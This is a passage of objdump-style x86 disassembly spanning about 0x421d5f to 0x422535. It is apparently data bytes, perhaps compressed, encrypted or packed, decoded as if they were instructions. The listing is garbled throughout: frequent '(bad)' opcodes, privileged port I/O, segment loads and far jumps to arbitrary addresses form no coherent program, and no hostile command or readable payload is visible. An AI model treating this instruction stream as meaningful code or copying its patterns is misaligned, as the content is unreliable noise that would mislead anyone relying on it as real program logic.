  421d5f:	xor    BYTE PTR [edi+eiz*1+0x23],bl
  421d63:	out    dx,al
  421d64:	push   eax
  421d65:	ror    BYTE PTR [ebx+0x1fe0c9ac],1
  421d6b:	mov    dh,0x6
  421d6d:	(bad)  
  421d6e:	in     al,dx
  421d6f:	fld    QWORD PTR [ebp-0x66]
  421d72:	adc    al,0x60
  421d74:	pavgw  mm5,mm3
  421d77:	or     al,cl
  421d79:	push   ebp
  421d7a:	int    0xc8
  421d7c:	ss xchg esi,eax
  421d7e:	in     al,0xd5
  421d80:	mov    edi,0x8f0f2e24
  421d85:	jg     0x421de2
  421d87:	xchg   ebx,eax
  421d88:	leave  
  421d89:	dec    esi
  421d8a:	cs nop
  421d8c:	mov    edi,0x229d39b9
  421d91:	ret    0x6ee2
  421d94:	or     al,0x5d
  421d96:	not    ecx
  421d98:	std    
  421d99:	pop    ds
  421d9a:	retf   
  421d9b:	xlat   BYTE PTR ds:[ebx]
  421d9c:	fnstenv [eax]
  421d9e:	pop    ebp
  421d9f:	pop    edx
  421da0:	lods   al,BYTE PTR ds:[esi]
  421da1:	mov    bl,BYTE PTR [edx]
  421da3:	repz test BYTE PTR [edx-0x41],al
  421da7:	mov    ebp,edi
  421da9:	sub    eax,0x5d8dc420
  421dae:	pop    ds
  421daf:	mov    dh,0x21
  421db1:	neg    BYTE PTR [esi]
  421db3:	lahf   
  421db4:	test   DWORD PTR [edx],eax
  421db6:	mov    DWORD PTR [ecx-0x72],0x6d27d4a1
  421dbd:	test   al,0xf6
  421dbf:	dec    edi
  421dc0:	adc    bh,al
  421dc2:	add    al,0x65
  421dc4:	test   ch,0x98
  421dc7:	enter  0x6d5c,0x14
  421dcb:	ins    BYTE PTR es:[edi],dx
  421dcc:	cli    
  421dcd:	cmc    
  421dce:	jp     0x421dc8
  421dd0:	push   edi
  421dd1:	sbb    esp,DWORD PTR [edi+0x4ea60910]
  421dd7:	or     bh,dh
  421dd9:	(bad)  
  421dda:	scas   al,BYTE PTR es:[edi]
  421ddb:	cmp    DWORD PTR [ebx],esp
  421ddd:	adc    al,0xd
  421ddf:	push   edi
  421de0:	sbb    eax,0xf079909c
  421de5:	inc    eax
  421de6:	jbe    0x421d78
  421de8:	sub    eax,0xa8f330f
  421ded:	mov    bl,0x21
  421def:	imul   eax,ebx,0x1
  421df2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421df3:	outs   dx,DWORD PTR ds:[esi]
  421df4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421df5:	or     DWORD PTR [edx],edx
  421df7:	pop    edx
  421df8:	inc    edx
  421df9:	mov    cl,0x3c
  421dfb:	pop    ds
  421dfc:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  421dfe:	mov    edx,0x6a84adae
  421e03:	mov    ?,WORD PTR [edi+eax*8+0x11]
  421e07:	inc    edi
  421e08:	out    dx,eax
  421e09:	call   0x3bbbb9a5
  421e0e:	rol    DWORD PTR [ebp+0x615910a],cl
  421e14:	test   DWORD PTR [edi-0x70],esp
  421e17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e18:	push   0x20c6982b
  421e1d:	mov    cs,WORD PTR [ecx]
  421e1f:	arpl   sp,di
  421e21:	lock dec ebp
  421e23:	ins    BYTE PTR es:[edi],dx
  421e24:	cli    
  421e25:	aaa    
  421e26:	or     esp,eax
  421e28:	or     BYTE PTR [ecx-0x5a],0x69
  421e2c:	(bad)  
  421e2d:	add    al,0x97
  421e2f:	inc    eax
  421e30:	icebp  
  421e31:	std    
  421e32:	pop    edi
  421e33:	jne    0x421e7a
  421e35:	pop    ecx
  421e36:	xchg   ecx,eax
  421e37:	jnp    0x421e57
  421e39:	add    al,0xe3
  421e3b:	into   
  421e3c:	pop    esp
  421e3d:	cwde   
  421e3e:	adc    cl,cl
  421e40:	dec    esi
  421e41:	loopne 0x421e87
  421e43:	cwde   
  421e44:	xor    DWORD PTR [ebx+eax*1-0x10706126],esp
  421e4b:	in     al,0x18
  421e4d:	pop    eax
  421e4e:	ds clc 
  421e50:	(bad)  [edi-0x3cda4604]
  421e56:	gs clc 
  421e58:	fdiv   DWORD PTR [esi+0x343e6d8f]
  421e5e:	in     eax,dx
  421e5f:	stos   BYTE PTR es:[edi],al
  421e60:	cmp    BYTE PTR ds:0x747b5498,ah
  421e66:	rol    edi,0x4f
  421e69:	ja     0x421e17
  421e6b:	out    dx,al
  421e6c:	inc    ebx
  421e6d:	std    
  421e6e:	fwait
  421e6f:	pop    ecx
  421e70:	xchg   ecx,ebx
  421e72:	mov    al,0x33
  421e74:	jl     0x421eac
  421e76:	out    0xc,al
  421e78:	hlt    
  421e79:	or     esi,DWORD PTR ds:0xa82c5831
  421e7f:	imul   eax,ebx,0x10
  421e82:	sub    al,0x19
  421e84:	xor    edi,DWORD PTR [esi-0x2b]
  421e87:	pop    esi
  421e88:	pop    esp
  421e89:	test   ch,dl
  421e8b:	lods   al,BYTE PTR ds:[esi]
  421e8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e8d:	outs   dx,BYTE PTR ds:[esi]
  421e8e:	cmp    DWORD PTR [ecx],edi
  421e90:	xchg   ebp,eax
  421e91:	push   esi
  421e92:	xchg   edx,eax
  421e93:	add    bl,al
  421e95:	jno    0x421e56
  421e97:	fyl2xp1 
  421e99:	xor    ecx,DWORD PTR [ebx-0x158a2a9f]
  421e9f:	pop    edx
  421ea0:	dec    ebx
  421ea1:	add    dl,BYTE PTR [edx+0x17b70073]
  421ea7:	mov    ecx,0x25ed8fc3
  421eac:	test   esi,eax
  421eae:	and    al,0x15
  421eb0:	inc    ebp
  421eb1:	ds cmc 
  421eb3:	test   BYTE PTR [edi-0x11],0x7f
  421eb7:	dec    esi
  421eb8:	cwde   
  421eb9:	sub    eax,0xebd9d925
  421ebf:	cwde   
  421ec0:	cmp    al,BYTE PTR [edx]
  421ec2:	int3   
  421ec3:	outs   dx,BYTE PTR ds:[esi]
  421ec4:	mov    ah,al
  421ec6:	or     BYTE PTR [edx+0x69],bh
  421ec9:	add    ecx,DWORD PTR [ecx+ebp*1+0x14]
  421ecd:	lods   al,BYTE PTR ds:[esi]
  421ece:	jmp    0x9050b69a
  421ed3:	imul   DWORD PTR [esi+eax*2+0x39b73733]
  421eda:	mov    esp,0x8ff2caf7
  421edf:	mov    ch,0xe6
  421ee1:	add    BYTE PTR [edi],bl
  421ee3:	aas    
  421ee4:	lahf   
  421ee5:	sar    DWORD PTR [ebx+0x51],1
  421ee8:	push   edx
  421ee9:	pop    esi
  421eea:	xor    eax,0xd78c2875
  421eef:	rol    esi,0xd7
  421ef2:	and    al,0x80
  421ef4:	push   ebx
  421ef5:	or     DWORD PTR [edi+0x4],0x37231e6b
  421efc:	cmp    eax,0xca718b58
  421f01:	pusha  
  421f02:	cmp    eax,0x4a87a266
  421f07:	test   BYTE PTR [edx+0x7b4d1d53],ch
  421f0d:	and    BYTE PTR [ebp+0x11],dh
  421f10:	xchg   eax,esi
  421f12:	mov    al,0xc6
  421f14:	jle    0x421ef0
  421f16:	mov    cl,0xa4
  421f18:	inc    eax
  421f19:	mov    ?,WORD PTR [eax+0x5e50ee10]
  421f1f:	repz in eax,dx
  421f21:	dec    esi
  421f22:	cdq    
  421f23:	dec    edi
  421f24:	adc    dl,BYTE PTR [esp+edx*1]
  421f27:	jle    0x421f65
  421f29:	retf   
  421f2a:	mov    ah,0x49
  421f2c:	rol    DWORD PTR [esi+0x19d15fc5],1
  421f32:	or     DWORD PTR [esi+ebx*2-0x72d3ce4b],esp
  421f39:	outs   dx,DWORD PTR ds:[esi]
  421f3a:	pop    ds
  421f3b:	push   cs
  421f3c:	add    al,0x8e
  421f3e:	imul   BYTE PTR [edi+0x21]
  421f41:	mov    ds:0xb8bfa127,eax
  421f46:	adc    esp,DWORD PTR [esi+ebp*2+0xec3be12]
  421f4d:	mov    ebx,0xde86b342
  421f52:	xchg   bx,ax
  421f54:	mov    edx,0x52f7649a
  421f59:	jne    0x421f15
  421f5b:	push   ebp
  421f5c:	mov    esp,0xc5de3c39
  421f61:	mov    edi,0xf44ac878
  421f66:	jns    0x421fd5
  421f68:	aad    0x6a
  421f6a:	inc    edx
  421f6b:	gs enter 0x42cd,0x7f
  421f70:	pusha  
  421f71:	cli    
  421f72:	xchg   esi,eax
  421f73:	sub    al,0xf0
  421f75:	(bad)  
  421f76:	pop    esp
  421f77:	add    bh,bh
  421f79:	sbb    DWORD PTR [ebx+0x523f4231],ecx
  421f7f:	xchg   ecx,eax
  421f80:	xchg   edx,eax
  421f81:	mov    fs,ebp
  421f83:	jmp    0xc2b95570
  421f88:	popa   
  421f89:	add    al,0x51
  421f8b:	test   al,0xa6
  421f8d:	jae    0x421fad
  421f8f:	xchg   ebp,eax
  421f90:	sub    BYTE PTR [ebx],al
  421f92:	add    eax,0x79aea634
  421f97:	test   eax,0xc024b89a
  421f9c:	xchg   ebp,eax
  421f9d:	pop    esi
  421f9e:	push   ecx
  421f9f:	mov    ecx,0x64b38c47
  421fa4:	inc    edi
  421fa5:	push   edx
  421fa6:	or     BYTE PTR [edx-0x7a],al
  421fa9:	mov    ebx,0x2e60d131
  421fae:	cli    
  421faf:	cmp    dh,al
  421fb1:	inc    ebp
  421fb2:	cli    
  421fb3:	popa   
  421fb4:	cmp    DWORD PTR [edi-0x43],esi
  421fb7:	xor    bh,ch
  421fb9:	cld    
  421fba:	mov    ds:0xcd6add9d,al
  421fbf:	mov    dh,0xce
  421fc1:	adc    al,BYTE PTR [ebp-0x375805d8]
  421fc7:	jp     0x422003
  421fc9:	fisub  WORD PTR [esi-0xc]
  421fcc:	jg     0x421fca
  421fce:	repnz cmp dh,BYTE PTR [edx]
  421fd1:	(bad)  
  421fd2:	call   0x373d:0x52244ddb
  421fd9:	shl    BYTE PTR [edx+esi*1],1
  421fdc:	sub    dh,BYTE PTR ds:0x771983cd
  421fe2:	inc    ebx
  421fe3:	jmp    0x1d20c6f5
  421fe8:	(bad)
  421fec:	scas   al,BYTE PTR es:[edi]
  421fed:	aaa    
  421fee:	pop    edx
  421fef:	jecxz  0x421fe1
  421ff1:	test   al,0xe6
  421ff3:	dec    esp
  421ff4:	push   ebp
  421ff5:	nop
  421ff6:	add    al,0xfa
  421ff8:	jp     0x421fdd
  421ffa:	sbb    al,BYTE PTR [edx+0x72]
  421ffd:	cmp    eax,0x31582421
  422002:	xor    edx,DWORD PTR [esp+esi*4]
  422005:	popf   
  422006:	in     eax,dx
  422007:	into   
  422008:	pusha  
  422009:	fwait
  42200a:	pop    edx
  42200b:	dec    esp
  42200c:	jle    0x421fcc
  42200e:	mov    ss,WORD PTR [edx]
  422010:	inc    esi
  422011:	(bad)  
  422012:	fist   WORD PTR [edx]
  422014:	push   es
  422015:	sbb    DWORD PTR [eax+0x54674229],ecx
  42201b:	in     eax,dx
  42201c:	cmp    eax,0x23d80e3a
  422021:	xor    ebx,DWORD PTR [ecx]
  422023:	xor    BYTE PTR [ecx-0x57],ch
  422026:	and    BYTE PTR [ecx+0x48],dh
  422029:	dec    edx
  42202a:	sbb    eax,0x5c172dea
  42202f:	sub    al,0x9a
  422031:	fcmove st,st(1)
  422033:	mov    ebx,0x92a735e
  422038:	push   ebx
  422039:	in     al,dx
  42203a:	jecxz  0x4220b8
  42203c:	out    dx,al
  42203d:	xchg   esp,eax
  42203e:	(bad)  
  42203f:	sbb    al,0x53
  422041:	(bad)  
  422042:	jmp    0x42208b
  422044:	imul   esi,DWORD PTR [edi+ebp*8],0xb1bb3293
  42204b:	xor    edx,DWORD PTR [ebx]
  42204d:	jns    0x422007
  42204f:	jb     0x422037
  422051:	clc    
  422052:	jo     0x4220bb
  422054:	push   ds
  422055:	(bad)  
  422056:	dec    DWORD PTR [edx-0x56]
  422059:	ins    BYTE PTR es:[edi],dx
  42205a:	xlat   BYTE PTR ds:[ebx]
  42205b:	out    dx,al
  42205c:	ror    bl,0x7
  42205f:	jno    0x422009
  422061:	aad    0x4
  422063:	mov    edx,0xecd90d25
  422068:	push   ebp
  422069:	pop    esp
  42206a:	cmp    eax,0x27555810
  42206f:	mov    ecx,0xa9b0a41f
  422074:	push   esi
  422075:	pop    esp
  422076:	add    al,0xb8
  422078:	clc    
  422079:	and    BYTE PTR [esi-0x241a30ad],cl
  42207f:	ror    BYTE PTR ds:0xc4b8247d,cl
  422085:	fiadd  WORD PTR [ebx+0x1f]
  422088:	ins    DWORD PTR es:[edi],dx
  422089:	mov    esp,0x32b06689
  42208e:	rcl    DWORD PTR [edx+eax*2],0xe8
  422092:	shr    ah,0x57
  422095:	jae    0x4220ae
  422097:	jb     0x4220ec
  422099:	daa    
  42209a:	out    0x93,eax
  42209c:	lock shl BYTE PTR [eiz*1+0x279d970f],1
  4220a4:	xor    BYTE PTR [edx+0x3dde645f],ah
  4220aa:	shl    BYTE PTR [edi],cl
  4220ac:	jmp    0x42208a
  4220ae:	jne    0x4220bd
  4220b0:	push   cs
  4220b1:	mov    DWORD PTR [esp+edx*1+0x4b9ca791],esp
  4220b8:	idiv   BYTE PTR [edx-0x1a42e510]
  4220be:	loop   0x42206f
  4220c0:	(bad)  
  4220c1:	xor    DWORD PTR [esi+0x71ddb611],esi
  4220c7:	inc    ebp
  4220c8:	pop    ss
  4220c9:	and    al,0x72
  4220cb:	stos   BYTE PTR es:[edi],al
  4220cc:	gs push eax
  4220ce:	adc    DWORD PTR [ebp-0x6b],eax
  4220d1:	daa    
  4220d2:	stos   DWORD PTR es:[edi],eax
  4220d3:	out    0xe6,al
  4220d5:	mov    al,ds:0xa9266005
  4220da:	leave  
  4220db:	loop   0x4220a7
  4220dd:	pop    es
  4220de:	lea    edi,[edi]
  4220e0:	stos   BYTE PTR es:[edi],al
  4220e1:	jecxz  0x42207d
  4220e3:	add    edi,ecx
  4220e5:	std    
  4220e6:	dec    esp
  4220e7:	in     eax,dx
  4220e8:	jo     0x4220fd
  4220ea:	or     al,0x6a
  4220ec:	into   
  4220ed:	jno    0x4220f6
  4220ef:	ss dec esp
  4220f1:	and    eax,0xdbddad92
  4220f6:	in     al,dx
  4220f7:	lds    edi,FWORD PTR [edi-0x51855a23]
  4220fd:	sub    al,0x5c
  4220ff:	adc    al,0xc2
  422101:	iret   
  422102:	xor    DWORD PTR [edi],eax
  422104:	mov    bh,0xd6
  422106:	and    cl,BYTE PTR [esp]
  422109:	scas   eax,DWORD PTR es:[edi]
  42210a:	inc    eax
  42210b:	ds dec esi
  42210d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42210e:	ins    DWORD PTR es:[edi],dx
  42210f:	add    esi,edx
  422111:	add    bl,al
  422113:	in     eax,0x5e
  422115:	and    cl,BYTE PTR [eax+eiz*1]
  422118:	xchg   ecx,eax
  422119:	jae    0x422127
  42211b:	int3   
  42211c:	(bad)  
  42211e:	or     al,0xd3
  422120:	rcl    ecx,0x32
  422123:	push   cs
  422124:	pop    es
  422125:	fcom   DWORD PTR [ebp-0x5f107562]
  42212b:	outs   dx,BYTE PTR ds:[esi]
  42212d:	(bad)  
  42212e:	push   cs
  42212f:	adc    al,0x46
  422131:	ja     0x42210a
  422133:	pop    eax
  422134:	mov    ch,0x5
  422136:	lock aad 0xd7
  422139:	or     BYTE PTR [ebp+0x26fe77eb],bl
  42213f:	fsub   st,st(7)
  422141:	sub    eax,0xfc49a3ad
  422146:	mov    esi,0x4e868973
  42214b:	mov    esi,0x3dfc7f99
  422150:	gs iret 
  422152:	dec    esp
  422153:	push   0x8276e8b0
  422158:	bnd jp 0x422132
  42215b:	sti    
  42215c:	repz dec edi
  42215e:	popf   
  42215f:	pop    edx
  422160:	aam    0xa3
  422162:	cmp    eax,DWORD PTR [edi]
  422164:	imul   ebp,ebp,0xfffffff4
  422167:	stc    
  422168:	fcmovnb st,st(4)
  42216a:	call   0xf0c7:0x4b02a792
  422171:	sbb    ebx,DWORD PTR [ecx+0x21]
  422174:	and    DWORD PTR ds:0xacb3f23b,0x9ffecd38
  42217e:	xchg   edi,eax
  42217f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422180:	fisttp WORD PTR [edx+0x11]
  422183:	(bad)  
  422184:	push   ecx
  422185:	imul   eax,edi,0x1f0f7550
  42218b:	dec    edi
  42218c:	fwait
  42218d:	push   edx
  42218e:	je     0x42218a
  422190:	mov    eax,ds:0xa15dae74
  422195:	js     0x42216a
  422197:	pusha  
  422198:	out    0x17,eax
  42219a:	adc    eax,0x4dc04fdf
  42219f:	shl    DWORD PTR [ebx-0x6c],0xb1
  4221a3:	mov    ds:0x7c16174b,eax
  4221a8:	in     eax,dx
  4221a9:	data16 xlat BYTE PTR ds:[ebx]
  4221ab:	jb     0x422227
  4221ad:	mov    dl,0x1b
  4221af:	mov    ebx,0xc0f8d2ab
  4221b4:	outs   dx,BYTE PTR ds:[esi]
  4221b5:	xchg   esi,eax
  4221b6:	loop   0x422183
  4221b8:	mov    bl,0x61
  4221ba:	daa    
  4221bb:	jge    0x4221eb
  4221bd:	(bad)  
  4221bf:	or     ebx,DWORD PTR [esi-0x10ad0da6]
  4221c5:	iret   
  4221c6:	sub    ah,dl
  4221c8:	sbb    BYTE PTR [eax+ebp*4+0x26],ch
  4221cc:	test   al,0x63
  4221ce:	std    
  4221cf:	mov    BYTE PTR [edx+ecx*1+0x9],ah
  4221d3:	cvtps2pi mm2,QWORD PTR [edx+0x2d8f269d]
  4221da:	mov    edi,DWORD PTR [ebx-0x14939213]
  4221e0:	xor    dl,0x64
  4221e3:	jno    0x42220c
  4221e5:	sub    eax,0x59b2c86
  4221ea:	scas   eax,DWORD PTR es:[edi]
  4221eb:	cmp    BYTE PTR [esi-0x7e],ah
  4221ee:	(bad)  
  4221ef:	push   ebx
  4221f0:	fiadd  WORD PTR ds:0xc24e50e
  4221f6:	push   eax
  4221f7:	in     al,dx
  4221f8:	or     ebp,esi
  4221fa:	mov    eax,0xfae77743
  4221ff:	or     BYTE PTR [ebx+ebp*4],dh
  422202:	fs xor bl,bh
  422205:	xchg   ecx,eax
  422206:	xchg   ebp,eax
  422207:	xor    dh,cl
  422209:	repz xor edx,edi
  42220c:	pop    eax
  42220d:	and    eax,0x3d49928e
  422212:	(bad)  
  422213:	adc    esp,DWORD PTR [edx+0x54]
  422216:	push   esp
  422217:	mov    ch,0xbb
  422219:	adc    edx,DWORD PTR [edi-0x5d36bb8c]
  42221f:	mov    al,0x7b
  422221:	sbb    ebx,DWORD PTR [ebx+0x4f]
  422224:	sub    al,0xa
  422226:	rcl    DWORD PTR [esi-0x41],cl
  422229:	fwait
  42222a:	(bad)  
  42222b:	retf   0xe866
  42222e:	mov    WORD PTR [ebx+eax*4+0x15],ds
  422232:	and    DWORD PTR [ebx+0x7a],ebx
  422235:	and    DWORD PTR [eax],ecx
  422237:	cmp    eax,0x1fe1b2d1
  42223c:	mov    dx,0x18da
  422240:	and    ch,BYTE PTR [di]
  422243:	pop    ebp
  422244:	or     al,0xd7
  422246:	retf   
  422247:	mov    cl,0xff
  422249:	pop    esi
  42224a:	ins    DWORD PTR es:[edi],dx
  42224b:	xor    al,0x7
  42224d:	inc    esp
  42224e:	dec    esi
  42224f:	aad    0x9d
  422251:	sbb    al,BYTE PTR [ebp+0x480d7b39]
  422257:	push   ecx
  422258:	and    BYTE PTR [edi-0x512db3b1],al
  42225e:	or     al,0xa8
  422260:	mov    eax,ds:0x137fa3a2
  422265:	shl    DWORD PTR [edx-0x40],0x86
  422269:	fadd   QWORD PTR [ebp-0x4f6b123b]
  42226f:	vfnmadd132sd xmm4{k4}{z},xmm2,xmm1
  422275:	pop    edi
  422276:	lea    esi,[ebx]
  422278:	and    edi,edx
  42227a:	xchg   DWORD PTR [edx+0x1a],ecx
  42227d:	pop    ss
  42227e:	xchg   ebx,eax
  42227f:	lods   eax,DWORD PTR ss:[esi]
  422281:	neg    BYTE PTR [esp+eax*1-0x71]
  422285:	je     0x4222aa
  422287:	pop    ebx
  422288:	mov    esi,0x155060ec
  42228d:	fbld   TBYTE PTR [edi-0x430d8235]
  422293:	imul   esp,DWORD PTR [ecx+ebx*2+0x1b0c1dc],0x9
  42229b:	cmp    al,0xb5
  42229d:	cwde   
  42229e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42229f:	pcmpgtd mm5,QWORD PTR [esi+0x28]
  4222a3:	into   
  4222a4:	pop    ds
  4222a5:	and    DWORD PTR [esp+edi*4+0x35],ebx
  4222a9:	aas    
  4222aa:	cvttps2pi mm1,QWORD PTR [eax+0x3762c7cb]
  4222b1:	sahf   
  4222b2:	inc    edx
  4222b3:	int    0x5e
  4222b5:	fcom   QWORD PTR ds:0xc5929e16
  4222bb:	push   0xe55292d7
  4222c0:	ja     0x422313
  4222c2:	cmc    
  4222c3:	sahf   
  4222c4:	mul    DWORD PTR [ebx]
  4222c6:	dec    eax
  4222c7:	sbb    al,0x4c
  4222c9:	stos   BYTE PTR es:[edi],al
  4222ca:	mov    ebx,0xc4024475
  4222cf:	pop    edi
  4222d0:	imul   edx,DWORD PTR [edi-0x3168adda],0xffffffa8
  4222d7:	xchg   ebp,eax
  4222d8:	ror    edi,cl
  4222da:	pop    ebx
  4222db:	or     al,0x12
  4222dd:	stos   BYTE PTR es:[edi],al
  4222de:	mov    dl,0x9c
  4222e0:	push   ebx
  4222e1:	sti    
  4222e2:	pop    esp
  4222e3:	retf   
  4222e4:	in     al,dx
  4222e5:	(bad)  
  4222e6:	test   BYTE PTR [ecx-0x3e],0x2c
  4222ea:	mov    al,ds:0x1537d916
  4222ef:	aam    0x25
  4222f1:	push   ss
  4222f2:	sub    edx,DWORD PTR [eax-0x1e7acb44]
  4222f8:	sahf   
  4222f9:	jo     0x422379
  4222fb:	scas   eax,DWORD PTR es:[edi]
  4222fc:	jecxz  0x42227e
  4222fe:	das    
  4222ff:	arpl   WORD PTR [edx-0xb],dx
  422302:	stos   BYTE PTR es:[edi],al
  422303:	pop    ecx
  422304:	and    al,0x42
  422306:	imul   edi,DWORD PTR [ebx+esi*8+0x3f],0xffffff97
  42230b:	mov    bh,BYTE PTR [edi-0x23]
  42230e:	lock int 0xb3
  422311:	mov    ds:0x5556fae1,eax
  422316:	xor    BYTE PTR [edi-0x62404432],0x6a
  42231d:	imul   edi,DWORD PTR [edi-0x4a],0x66
  422321:	sbb    DWORD PTR [ecx-0x6a533482],ebx
  422327:	mov    eax,0x598fb139
  42232c:	inc    edi
  42232d:	add    bh,BYTE PTR [ebx-0x2a]
  422330:	sbb    al,0x29
  422332:	add    ebx,0xffffff87
  422335:	cmp    cl,BYTE PTR gs:[edx-0x3b]
  422339:	aam    0xd2
  42233b:	in     eax,dx
  42233c:	dec    eax
  42233d:	lds    esi,FWORD PTR [edx]
  42233f:	jg     0x42231a
  422341:	or     edi,DWORD PTR [ecx]
  422343:	bound  edx,QWORD PTR [eax-0x78]
  422346:	mov    eax,ds:0xf540d3ce
  42234b:	cmp    eax,0x4028af6e
  422350:	adc    BYTE PTR [esi+0x57],cl
  422353:	mov    DWORD PTR [ebx+0x3ee61af2],ebx
  422359:	jbe    0x42237a
  42235b:	jg     0x42239f
  42235d:	mov    edi,0x7d8ba2ce
  422362:	inc    ebx
  422363:	xchg   BYTE PTR [edi-0x76],bh
  422366:	push   es
  422367:	and    bl,dl
  422369:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42236a:	jl     0x422310
  42236c:	xchg   ebp,eax
  42236d:	popf   
  42236e:	test   BYTE PTR [ecx],al
  422370:	push   edx
  422371:	ficom  DWORD PTR [esi-0x5250424f]
  422377:	int    0xdf
  422379:	lock fsub QWORD PTR [edx+0x707090b5]
  422380:	jle    0x42230a
  422382:	jecxz  0x4223f9
  422384:	dec    ecx
  422385:	enter  0xc0b1,0x8a
  422389:	mov    bh,0xc
  42238b:	adc    al,0x74
  42238d:	imul   ecx,DWORD PTR [edx],0xb2d47d0f
  422393:	fwait
  422394:	push   edx
  422395:	ret    0x856e
  422398:	push   esi
  422399:	inc    eax
  42239a:	jbe    0x42233e
  42239c:	pop    ecx
  42239d:	jne    0x4223c9
  42239f:	mov    esp,0xe3544859
  4223a4:	or     BYTE PTR [edx+0x6e],al
  4223a7:	mov    ds:0xedb87c2d,al
  4223ac:	fwait
  4223ad:	jae    0x422374
  4223af:	cwde   
  4223b0:	mov    cl,0x92
  4223b2:	lds    ebp,FWORD PTR [ebp-0x685a4f3c]
  4223b8:	xor    BYTE PTR [esi+0x7a],dh
  4223bb:	or     bh,cl
  4223bd:	call   FWORD PTR [ebx-0x41]
  4223c0:	gs inc ebp
  4223c2:	sar    BYTE PTR [esi+ecx*4],0xb3
  4223c6:	sub    BYTE PTR [esi],0x8c
  4223c9:	mov    BYTE PTR [eax+0x23eb5157],ch
  4223cf:	xchg   edx,eax
  4223d0:	push   0xffffffea
  4223d2:	aas    
  4223d3:	adc    al,BYTE PTR [ebx-0x24]
  4223d6:	into   
  4223d7:	sahf   
  4223d8:	jmp    0x8219:0xeb16654d
  4223df:	fild   DWORD PTR [eax*8-0x14951fea]
  4223e6:	xchg   edi,ebx
  4223e8:	mov    dl,0x76
  4223ea:	push   ecx
  4223eb:	retf   0xd9d5
  4223ee:	sti    
  4223ef:	test   BYTE PTR [edx+0x3a84fcff],al
  4223f5:	pop    ecx
  4223f6:	sar    DWORD PTR [esi-0x74ceb5f9],0xce
  4223fd:	test   DWORD PTR [ebx],0x64ba8bae
  422403:	pop    ebp
  422404:	pop    edi
  422405:	push   eax
  422406:	repnz mov eax,0x68916bd4
  42240c:	jo     0x4223b9
  42240e:	or     al,0x83
  422410:	mov    esi,0x1d25f452
  422415:	ja     0x42245f
  422417:	bound  eax,QWORD PTR [ecx-0x6c]
  42241a:	sbb    BYTE PTR [ecx],0x25
  42241d:	stc    
  42241e:	cdq    
  42241f:	neg    DWORD PTR [esi+ebx*4]
  422422:	fcom   DWORD PTR [esi]
  422424:	mov    edi,cs
  422426:	push   edx
  422427:	in     eax,dx
  422428:	loopne 0x4223bd
  42242a:	add    DWORD PTR [eax],edx
  42242c:	jle    0x42240a
  42242e:	call   0xd41f4f20
  422433:	mov    eax,0xfff4a75
  422438:	push   es
  422439:	and    ebp,DWORD PTR [ecx-0xe2e5090]
  42243f:	mov    al,0xb2
  422441:	push   ecx
  422442:	gs push es
  422444:	mov    dh,0xf2
  422446:	shl    al,1
  422448:	pop    es
  422449:	jo     0x422419
  42244b:	popf   
  42244c:	mov    dh,0x49
  42244e:	outs   dx,DWORD PTR ds:[esi]
  42244f:	add    eax,0x1d242c2b
  422454:	xchg   edx,eax
  422455:	ror    ebx,cl
  422457:	test   DWORD PTR [edi],ecx
  422459:	adc    esi,ebp
  42245b:	add    dl,BYTE PTR [edi+0x75]
  42245e:	and    DWORD PTR [ebx-0x5c0288d8],0xb46171d3
  422468:	sahf   
  422469:	mov    bh,0x47
  42246b:	jp     0x42247b
  42246d:	adc    al,0x4c
  42246f:	push   0x42
  422471:	hlt    
  422472:	fstp   TBYTE PTR [eax]
  422474:	ret    0xf7df
  422477:	fdivr  DWORD PTR [edi+edi*1]
  42247a:	gs sahf 
  42247c:	mov    ds:0x75cc27b1,eax
  422481:	lea    edx,[edi]
  422483:	jo     0x4224aa
  422485:	retf   0x29c3
  422488:	jo     0x42241b
  42248a:	sbb    ah,BYTE PTR [ecx+0x71]
  42248d:	xor    esi,DWORD PTR [ecx]
  42248f:	dec    ebx
  422490:	jmp    0x9c79b067
  422495:	mov    dl,0x98
  422497:	mov    esp,0xfc400eae
  42249c:	das    
  42249d:	lods   eax,DWORD PTR ds:[esi]
  42249e:	jp     0x422473
  4224a0:	inc    esi
  4224a1:	cmp    cl,BYTE PTR [edx-0x56]
  4224a4:	pushf  
  4224a5:	xor    al,0xbf
  4224a7:	pop    eax
  4224a8:	jne    0x42250c
  4224aa:	popa   
  4224ab:	xlat   BYTE PTR ds:[ebx]
  4224ac:	mov    al,ds:0xff82ba74
  4224b1:	shl    BYTE PTR [ecx+edi*2+0x5df65896],0x35
  4224b9:	jo     0x422513
  4224bb:	pop    ebx
  4224bc:	xchg   ch,cl
  4224be:	(bad)  
  4224bf:	call   0xc95d:0x999e918c
  4224c6:	jle    0x422460
  4224c8:	out    0x4c,eax
  4224ca:	jp     0x422516
  4224cc:	mov    bl,cl
  4224ce:	cmp    eax,0x50ae001a
  4224d3:	ss push 0x4a71b764
  4224d9:	pop    ecx
  4224da:	push   ecx
  4224db:	push   0xca1eec9
  4224e0:	cmc    
  4224e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4224e2:	mov    ebp,0xf6b61d74
  4224e7:	mov    eax,0x7a0ca36f
  4224ec:	das    
  4224ed:	cmp    eax,0x4a80ca2a
  4224f2:	sbb    BYTE PTR ds:0x9a25dc29,cl
  4224f8:	pop    ebx
  4224f9:	ret    
  4224fa:	ret    
  4224fb:	sub    eax,0xa67938f6
  422500:	xlat   BYTE PTR ds:[ebx]
  422501:	cs cs sahf 
  422504:	pop    ss
  422505:	mov    al,ds:0x101ffa29
  42250a:	(bad)  [eax-0xa90c5b4]
  422510:	mov    bl,ch
  422512:	inc    edi
  422513:	mov    al,ds:0xc64b00e9
  422518:	loope  0x42250a
  42251a:	pop    esp
  42251b:	xchg   ebx,eax
  42251c:	sbb    BYTE PTR [ebx+0x4a],cl
  42251f:	xor    bh,al
  422521:	push   0xfffffff5
  422523:	mov    al,0x29
  422525:	es and bh,dh
  422528:	outs   dx,DWORD PTR ds:[esi]
  422529:	cmc    
  42252a:	mov    esp,0x4e1abe2c
  42252f:	imul   esp,ebp,0xdad7b3d8
  422535:	xchg   DWORD PTR [ebx+0x2],edx
